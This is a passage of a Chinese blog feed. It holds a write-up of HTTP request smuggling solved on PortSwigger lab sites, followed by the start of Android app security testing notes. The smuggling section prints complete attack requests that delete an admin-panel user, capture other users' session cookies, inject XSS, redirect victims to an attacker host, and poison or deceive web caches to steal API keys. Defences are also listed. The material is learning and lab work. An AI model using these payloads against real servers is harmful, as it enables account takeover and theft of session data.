&#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111387508.png" alt="image-20200715161010401"></p>
<p>​    此处需说明一点，请求包中chunk分块传输的数据库长度必须正确，同时走私请求中的Content-Length长度也需保证正确，否则会提示无法识别或非法请求。（因而这里87对应的十进制是：135。）</p>
<p><img src="https://image.3001.net/images/20200716/15949111413085.png" alt="image-20200715161600238"></p>
<h3 id="5-2-显示前端请求重写"><a href="#5-2-显示前端请求重写" class="headerlink" title="5.2 显示前端请求重写"></a>5.2 显示前端请求重写</h3><p>​    在这种网络环境下，前端代理服务器在接收到请求后不会直接将请求转发给后端服务器，而是先添加一些必要的字段然后转发给后端服务器。</p>
<p>​    如果不能获取到前端代理服务器添加或重写的字段，那么我们走私的请求就无法被后端服务器处理。</p>
<p>​    如何获取这些值，这里有一个简单的方法：</p>
<ol>
<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
</ol>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p>
<p>​    页面有个搜索框：</p>
<p><img src="https://image.3001.net/images/20200716/1594911145829.png" alt="image-20200715163817407"></p>
<p>​    并且请求参数中的值能够输出到相应的POST请求中</p>
<p><img src="https://image.3001.net/images/20200716/1594911148265.png" alt="image-20200715163859508"></p>
<p>​    构造一个走私请求数据包，多次发送在前端中显示了HTTP请求</p>
<blockquote>
<p>解释一下：走私请求数据包中Content-length: 100，显然自身携带数据没有达到这个数目。</p>
<p>因而后端服务器会在收到第一个走私请求时会误以为该请求还没有结束，将不断接受新传来的HTTP请求直到长度达到100。</p>
<p>因此添加在search=test后的HTTP请求也成POST请求的一部分，最终将前端服务器添加的HTTP头显示在页面</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 109</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Udg4bkicRfjM9f2QNx0zP6Z51mcp0cfW</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">search&#x3D;test</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111522527.png" alt="image-20200715164704552"></p>
<p>​    将获取的HTTP头添加到走私请求中，再次发送数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 138</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Udg4bkicRfjM9f2QNx0zP6Z51mcp0cfW</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">X-FxStVB-Ip: 175.6.47.8</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">search&#x3D;test</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111576185.png" alt="image-20200715165211125"></p>
<p>​    重新构造一下xff头，值改为127.0.0.1，可查看到<code>/admin</code>界面</p>
<p><img src="https://image.3001.net/images/20200716/15949111605661.png" alt="image-20200715165730569"></p>
<p>​    构造删除用户数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 170</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Udg4bkicRfjM9f2QNx0zP6Z51mcp0cfW</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1</span><br><span class="line">X-FxStVB-Ip: 127.0.0.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111651702.png" alt="image-20200715170954582"></p>
<h3 id="5-3-捕获其他用户的请求"><a href="#5-3-捕获其他用户的请求" class="headerlink" title="5.3 捕获其他用户的请求"></a>5.3 捕获其他用户的请求</h3><p>​    如果应用程序包含任何允许存储和检索文本数据的功能，则可以使用HTTP请求走私来捕获其他用户请求的内容。这些可能包括会话令牌，启用会话劫持攻击或用户提交的其他敏感数据。用作攻击手段的合适功能是注释，电子邮件，配置文件描述，屏幕名称等。</p>
<p>​    要进行攻击，您需要走私一个将数据提交到存储功能的请求，其参数包含位于请求最后的数据。后端服务器处理的下一个请求将附加到走私请求上，结果将存储另一个用户的原始请求。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p>
<p>​    访问博客文章并发表评论。将<code>comment-post</code>请求发送到Burp Repeater，将主体参数随机播放，以使该<code>comment</code>参数最后出现，并确保它仍然有效。将<code>comment-post</code>请求<code>Content-Length</code>增加到400，然后将其走私到后端服务器，构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac9e1f401f037f30802f1770002200fc.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;GvJSTvhXyJeJlPNbJZHneuEjDwJL24XL</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 259</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;post&#x2F;comment HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 600</span><br><span class="line">Cookie: session&#x3D;GvJSTvhXyJeJlPNbJZHneuEjDwJL24XL</span><br><span class="line"></span><br><span class="line">csrf&#x3D;ZrUm7NFnwTcKipoyhKdLML4JUG2nsVKs&amp;postId&#x3D;4&amp;name&#x3D;joker&amp;email&#x3D;test%40test.com&amp;website&#x3D;&amp;comment&#x3D;test</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111706677.png" alt="image-20200715211510854"></p>
<p>​    查看博客文章以查看是否有包含用户请求的评论。请注意，目标用户只会间歇地浏览该网站，因此您可能需要多次重复此攻击才能成功。</p>
<p>​    如果存储的请求不完整并且不包含Cookie头，则需要缓慢增加走私请求中Content-Length头的值，直到捕获整个cookie。</p>
<p>​    从注释中复制用户的Cookie标头，然后使用它访问其帐户。</p>
<p><img src="https://image.3001.net/images/20200716/15949111734542.png" alt="image-20200715211714093"></p>
<p>​    上图为自己访问，获取自己的cookie。</p>
<p>​    如果需要获取到机器人的cookie值，需要不断的摸索CL长度，把cookie值显示完全，不能太长也不能太短。用了将近两个小时摸索到规律（说到底还是自己太菜了。。），获取的cookie如下：</p>
<p><img src="https://image.3001.net/images/20200716/15949111789844.png" alt="image-20200715231233458"></p>
<h3 id="5-4-使用HTTP请求走私来利用反射的XSS"><a href="#5-4-使用HTTP请求走私来利用反射的XSS" class="headerlink" title="5.4 使用HTTP请求走私来利用反射的XSS"></a>5.4 使用HTTP请求走私来利用反射的XSS</h3><p>​    如果应用程序容易受到HTTP请求走私的影响，并且还包含反射的XSS，则可以使用请求走私攻击来攻击该应用程序的其他用户。这种方法在两种方面优于对反射XSS的正常利用：</p>
<ul>
<li>它不需要与受害者用户进行交互。您不需要向他们提供URL，也不必等待他们访问它。您只是走私了包含XSS有效负载的请求，后端服务器将处理下一个用户的请求。</li>
<li>它可以用于在请求的某些部分中利用XSS行为，而这些部分在正常的反射XSS攻击中是无法轻松控制的，例如HTTP请求标头。</li>
</ul>
<p>​    构造请求包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acdb1f261ef53650804e1f3600d400b1.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;5ZwMRDsuysnQYYEpfXKei2HCGDchgjN8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;#</span><br></pre></td></tr></table></figure>

<p>​    其他用户如果在攻击者将请求走私到后端服务器之后访问该页面，将弹框</p>
<p><img src="https://image.3001.net/images/20200716/15949111821617.png" alt="image-20200715222528925"></p>
<p>​    对照响应包可以看到xss插入的位置</p>
<p><img src="https://image.3001.net/images/20200716/15949111874162.png" alt="image-20200715222848241"></p>
<h3 id="5-5-使用HTTP请求走私将现场重定向转变为开放重定向"><a href="#5-5-使用HTTP请求走私将现场重定向转变为开放重定向" class="headerlink" title="5.5 使用HTTP请求走私将现场重定向转变为开放重定向"></a>5.5 使用HTTP请求走私将现场重定向转变为开放重定向</h3><p>​    许多应用程序执行从一个URL到另一个URL的现场重定向，并将主机名从请求的<code>Host</code>标头放入重定向URL。一个示例是Apache和IIS Web服务器的默认行为，在该行为中，对不带斜杠的文件夹的请求将收到对包含该斜杠的文件夹的重定向：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;normal-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>

<p>​    通常，此行为被认为是无害的，但是可以在请求走私攻击中利用它来将其他用户重定向到外部域。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>

<p>​    走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>

<p>​    在此，用户请求的是一个JavaScript文件，该文件是由网站上的页面导入的。攻击者可以通过在响应中返回自己的JavaScript来完全破坏受害者用户。</p>
<h3 id="5-6使用HTTP请求走私来执行Web缓存中毒"><a href="#5-6使用HTTP请求走私来执行Web缓存中毒" class="headerlink" title="5.6使用HTTP请求走私来执行Web缓存中毒"></a>5.6使用HTTP请求走私来执行Web缓存中毒</h3><p>​    在上述攻击的一种变体中，可能有可能利用HTTP请求走私来执行Web缓存中毒攻击。如果前端基础架构的任何部分执行内容缓存（通常出于性能原因），则可能会使用场外重定向响应来毒化缓存。这将使攻击持续存在，从而影响随后请求受影响URL的所有用户。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p>
<p>​    这个环境也是一个可以修改 Host 进行跳转的场景，而在<code>/post/next?postId=2</code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是<code>/post?postId=4</code>。    </p>
<p>​    选择<code>/resources/js/tracking.js</code>进行投毒，进行以下设置：</p>
<p><img src="https://image.3001.net/images/20200716/15949111969193.png" alt="image-20200716104253220"></p>
<p>​    使用漏洞利用服务器的主机名启动的攻击，以毒化服务器缓存，构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acb61fb81ff55c6580dd489600210048.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;dI8YCOAhKmFfWG2IpulfysNUQ2X404e3</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 182</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: ac5a1f711ff15cf780ed48720140009f.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>

<p>​    发送数据包，然后访问<code>/resources/js/tracking.js</code>:</p>
<p><img src="https://image.3001.net/images/20200716/1594911201308.png" alt="image-20200716105706714"></p>
<p>​    我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：</p>
<p><img src="https://image.3001.net/images/20200716/15949112044742.png" alt="image-20200716110953602"></p>
<p>​    出现弹框。</p>
<h3 id="5-7使用HTTP请求走私来执行Web缓存欺骗"><a href="#5-7使用HTTP请求走私来执行Web缓存欺骗" class="headerlink" title="5.7使用HTTP请求走私来执行Web缓存欺骗"></a>5.7使用HTTP请求走私来执行Web缓存欺骗</h3><p>​    在攻击的另一种形式中，您可以利用HTTP请求走私来执行Web缓存欺骗。这与Web缓存中毒攻击的工作方式相似，但目的不同。</p>
<p><u><strong>Web缓存中毒和Web缓存欺骗之间有什么区别？</strong></u></p>
<ul>
<li>在<strong>Web缓存中毒中</strong>，攻击者使应用程序在缓存中存储一些恶意内容，然后将这些内容从缓存中提供给其他应用程序用户。</li>
<li>在<strong>Web缓存欺骗中</strong>，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</li>
</ul>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception</a></p>
<p>​    先登录账户，单击右上角的“帐户详细信息”，然后观察到响应没有任何反缓存标头。构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acba1f671f8c7fc0805f8775001c003e.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;qKO9bEKjYR759Tozcni7YKBU52SHcVlQ</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 44</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;my-account HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>

<p>​    然后在无痕浏览器中加载主页，只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front 服务器缓存起来，我们就可以拿到用户<code>/private/messages</code>的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。</p>
<p><img src="https://image.3001.net/images/20200716/15949112096782.png" alt="image-20200716140839913"></p>
<p>​    上图为自己在无痕中访问获得的API Key。</p>
<p><img src="https://image.3001.net/images/20200716/15949112125993.png" alt="image-20200716185545018"></p>
<p>​    上图是机器人的API Key，整了一个下午终于获取到了机器人的API Key了（有点强迫症，如果留一个实验没通过很难受），他那个机器人有点问题，还是要看运气。或许欧皇发一两次包就遇到了。</p>
<h2 id="6、如何防止HTTP请求走私漏洞"><a href="#6、如何防止HTTP请求走私漏洞" class="headerlink" title="6、如何防止HTTP请求走私漏洞"></a>6、如何防止HTTP请求走私漏洞</h2><p>​    如果前端服务器通过同一网络连接将多个请求转发到后端服务器，并且后端连接所使用的协议承担着两个服务器不同意边界之间的风险，则会出现HTTP请求走私漏洞。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p>
<ul>
<li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li>
<li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li>
<li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li>
</ul>
<p>​    在某些情况下，可以通过使前端服务器规范化歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://wiki.0-sec.org/#/md" target="_blank" rel="noopener">https://wiki.0-sec.org/#/md</a><br><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a><br><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p>
]]></content>
      <categories>
        <category>HTTP请求走私</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>HTTP请求走私</tag>
      </tags>
  </entry>
  <entry>
    <title>APP安全测试学习笔记</title>
    <url>/2020/07/10/App%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>​    通过辉哥发的 “APP安全检测指南–作者：panda” 跟进学习app渗透测试。</p>
<p><img src="https://image.3001.net/images/20200710/15943664048203.png" alt="image-20200710153320829"></p>
<a id="more"></a>

<h2 id="1-客户端程序安全"><a href="#1-客户端程序安全" class="headerlink" title="1.客户端程序安全"></a>1.客户端程序安全</h2><h3 id="1-1安装包签名"><a href="#1-1安装包签名" class="headerlink" title="1.1安装包签名"></a>1.1安装包签名</h3><p>​    用JDK的jarsigner.exe检查安全包的签名，命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jarsigner.exe -verify APK文件路径 -verbose -certs</span><br></pre></td></tr></table></figure>

<p>​    以某个算命app为例，结果如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657453016.png" alt="image-20200627224441281"></p>
<p>​    如上图，测试结果为安全。只有使用直接客户的证书签名时才认定为安全，Debug 证书、第三方（如开发方）证书等均认为风险。</p>
<h3 id="1-2反编译保护"><a href="#1-2反编译保护" class="headerlink" title="1.2反编译保护"></a>1.2反编译保护</h3><p>​    把apk当做zip解压，得到classes.dex文件（可能不止一个 .dex 文件），解压后如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657505268.png" alt="image-20200628101834819"></p>
<p>​    使用dex2.jar执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dex2jar.bat classes.dex 文件路径</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943657542165.png" alt="image-20200628102833253"></p>
<p>​    得到classes.dex.jar文件</p>
<p><img src="https://image.3001.net/images/20200710/15943657588776.png" alt="image-20200628102833254"></p>
<p>​    使用jd-gui打开jar文件，可得到JAVA代码</p>
<p><img src="https://image.3001.net/images/20200710/15943657665063.png" alt="image-20200628104345358"></p>
<p>​    如上图，逆向后发现代码未做混淆，是不安全的。</p>
<p>​    下图为混淆后的代码，函数和变量名用无意义的字符来代替：</p>
<p><img src="https://image.3001.net/images/20200710/15943657716598.png" alt="image-20200628104622176"></p>
<p>​    通过博客得知混淆的原理：android平台的混淆原理是用“不能直接猜出含义 的通用变量名和函数名a b c等”替换编译后程序包中“ 具有明显语义信息 的变量名和函数名”，这样，通过逆向工程得到的只是 难以理解 的代码。代码混淆并不能从根本上阻止反编译等。因为代码混淆仅仅提高了阅读难度，但并不能真正阻止反编译。</p>
<h3 id="1-3应用完整性校验"><a href="#1-3应用完整性校验" class="headerlink" title="1.3应用完整性校验"></a>1.3应用完整性校验</h3><p>​    用apktool将目标apk文件解包，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar d -f apk文件路径 -o 解包目标文件夹</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943657763053.png" alt="image-20200628105738136"></p>
<p>​    文件结构如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657798481.png" alt="image-20200628105847820"></p>
<p>​    通过修改解包目录中的文件，可以找到logo之类的图进行修改（比较好辨认结果），我修改了咨询处的图片，如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657834488.png" alt="image-20200628113532130"></p>
<p>​    用apktool，把解包目录重新打包成未签名的apk文件，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar b -f 待打包的文件夹 -o 输出apk目录</span><br></pre></td></tr></table></figure>

<p>​    重新打包的时候出现很多问题，具体百度加玄学解决了</p>
<p><img src="https://image.3001.net/images/20200710/15943658034480.png" alt="image-20200628184932619"></p>
<p>​    成功输出apk文件</p>
<p><img src="https://image.3001.net/images/20200710/15943658112861.png" alt="image-20200628185217847"></p>
<p>​    用SignApk，对未签名的APK文件进行签名，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar signapk.jar testkey.x509.pem testkey.pk8 待签名apk文件路径 签名后输出apk路径</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943658167990.png" alt="image-20200629105838083"></p>
<p>​    输出签名后的apk</p>
<p><img src="https://image.3001.net/images/20200710/15943658191790.png" alt="image-20200629105858875"></p>
<p>​    将签了名的APK安装、运行、确认是否存在自校验；需要注意的是，如果之前安装的APK和修改后的APK签名不同，就不能直接覆盖安装，一般来说，先卸载之前安装的APP即可。</p>
<p>​    将客户端程序文件反编译，修改源码或资源文件后重新打包安装运行，结果如下图：</p>
<p><img src="https://image.3001.net/images/20200710/1594365822747.png" alt="image-20200629110321139"></p>
<p>​    之前为咨询图片的位置，我换成了另一张图片。经测试，此某算命app是可以被重新打包运行的。</p>
<p>​    如果是经过自校验后的情况，修改源码资源后是无法正常启动的。</p>
<h3 id="1-4组件安全"><a href="#1-4组件安全" class="headerlink" title="1.4组件安全"></a>1.4组件安全</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>​    使用apktool解包，打开解包目录中的AndroidManifest.xml，对其中声明的各个组件，根据以下规则判断是否可导出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.显式声明了android:exported&#x3D;&quot;true&quot;，则可导出；</span><br><span class="line">2.显示声明了android:exported&#x3D;&quot;false&quot;，则不可导出；</span><br><span class="line">3.未显示声明android:exported：</span><br><span class="line">​	a) 若组件不是Content Provider：</span><br><span class="line">​		i. 若组件包含&lt;intent-filter&gt;则可导出，反之不可；</span><br><span class="line">​	b) 若组件是Content Provider：</span><br><span class="line">​		i. 若SDK版本&lt;17则可导出，反之不可。</span><br></pre></td></tr></table></figure>

<p>​    从测试的角度上，只能判断组件是否导出，但能否构成危害需要详细分析源代码后才能得出结论。一般来说，在测试时尽管写清所有的导出组件，由客户开发侧确认相关组件是否确实需要导出即可。</p>
<p><img src="https://image.3001.net/images/20200710/15943658316155.png" alt="image-20200629144318194"></p>
<p>​    启动Activity和Content Provider大多是导出组件，一般无须理会。</p>
